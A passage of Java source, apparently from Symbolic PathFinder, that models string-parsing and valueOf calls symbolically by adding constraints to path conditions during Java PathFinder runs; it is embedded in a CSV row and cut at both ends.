id,title,username,language,date,content
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;
				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISDOUBLE, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._RvalueOf();
						int objRef = getNewObjRef(invInst, th); /* dummy Double Object */
						sf.push(objRef, true);
						sf = th.getModifiableTopFrame();
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTDOUBLE, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Double Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);
						//sf.push(0, true); // TODO: to review
					}
				}
			}
		}

	}

	public void handleParseDouble(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				return;
			} else {
				StringExpression sym_v1 = (StringExpression) sym_v3;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;
				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISDOUBLE, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						RealExpression sym_v2 = new SpecialRealExpression(sym_v1);
						sf.pushLong((long) 0); /* Result is don't care and 0 */
						//sf = th.getModifiableTopFrame(); ??
						sf.setLongOperandAttr(sym_v2);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTDOUBLE, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Double Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
					}
				}
			}
		}
	}

	public void handleParseLong(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				return;
			} else {
				StringExpression sym_v1 = (StringExpression) sym_v3;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;
				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISLONG, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						IntegerExpression sym_v2 = new SpecialIntegerExpression(sym_v1);
						sf.pushLong((long) 0); /* result is don't care */
						//sf = th.getModifiableTopFrame(); ??
						sf.setLongOperandAttr(sym_v2);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTLONG, sym_v1);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Long Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
					}
				}
			}
		}
	}

	public void handleParseBoolean(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;
			sf.pop();
			PathCondition pc;

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null)
				pc = new PathCondition();
			else
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

			assert pc != null;

			if (conditionValue) {
				pc.spc._addDet(StringComparator.ISBOOLEAN, sym_v1);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					IntegerExpression sym_v2 = new SpecialIntegerExpression(sym_v1);
					sf.push(0, false); /* result is don't care and 0 */
					sf = th.getModifiableTopFrame();
					sf.setOperandAttr(sym_v2);
				}
			} else {
				pc.spc._addDet(StringComparator.NOTBOOLEAN, sym_v1);
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					throw new RuntimeException(""ERROR: Boolean Format Type Exception"");
					//th.getVM().getSystemState().setIgnored(true);TODO: needs revision
				}
			}
		}
	}

	public int getNewObjRef(JVMInvokeInstruction invInst, ThreadInfo th) {
		
		//DynamicArea da = th.getVM().getDynamicArea();
		MethodInfo mi = invInst.getInvokedMethod();
		ClassInfo ci = ClassLoaderInfo.getCurrentResolvedClassInfo(mi.getReturnTypeName());
		ElementInfo objRef = th.getHeap().newObject(ci, th);
		return objRef.getObjectRef();
	}

	// works for BigDecimal
	public Instruction getBigDecimalValue(JVMInvokeInstruction invInst, ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod();
		ClassInfo ci = mi.getClassInfo();
		MethodInfo miInit = ci.getMethod(""toString()V"", false);
		if (miInit == null) {
			return null;
		}
		//Instruction initPC = miInit.execute(th);
		//return initPC;
		throw new RuntimeException(""not handled; to review"");
	}

	// works for String, StringBuilder, StringBuffer
	public Instruction init1NewStringObjRef(JVMInvokeInstruction invInst, ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod();
		ClassInfo ci = mi.getClassInfo();
		MethodInfo miInit = ci.getMethod(""<init>()V"", false);
		if (miInit == null) {
			return null;
		}
		//Instruction initPC = miInit.execute(th); // TODO: to review
		//return initPC;
		throw new RuntimeException(""not handled; to review"");
	}

	public Instruction handleIntValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleIntValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); 
			/*
			 * dummy
			 * string
			 * Object
			 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleFloatValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		RealExpression sym_v1 = (RealExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleFloatValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleLongValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleLongValueOf"");
		} else {
			sf.popLong();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleDoubleValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		RealExpression sym_v1 = (RealExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleDoubleValueOf"");
		} else {
			sf.popLong();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleBooleanValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleBooleanValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * string
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}
		return null;
	}

	public Instruction handleCharValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - CharValueOf"");
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);

		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have symbolic operand: handleIntValueOf"");
		} else {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf(sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef();
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		}

		return null;
	}

	public Instruction handleCharArrayValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		throw new RuntimeException(""ERROR: symbolic string method not Implemented - CharArrayValueof"");
	}

	public Instruction handleObjectValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v1 = (Expression) sf.getOperandAttr(0);
		if (sym_v1 instanceof SymbolicStringBuilder) {
			sf.pop();
			SymbolicStringBuilder sym_v3 = (SymbolicStringBuilder) sym_v1;
			StringExpression sym_v2 = StringExpression._valueOf((StringExpression) sym_v3.getstr());
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		} else if (sym_v1 instanceof StringExpression) {
			sf.pop();
			StringExpression sym_v2 = StringExpression._valueOf((StringExpression) sym_v1);
			int objRef = th.getHeap().newString("""", th).getObjectRef(); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef, true);
			sf.setOperandAttr(sym_v2);
		} else {
			throw new RuntimeException(""ERROR: symbolic string method not Implemented - ObjectValueof"");
		}
		return null;
	}

	public Instruction handleConcat(JVMInvokeInstruction invInst, ThreadInfo th) {
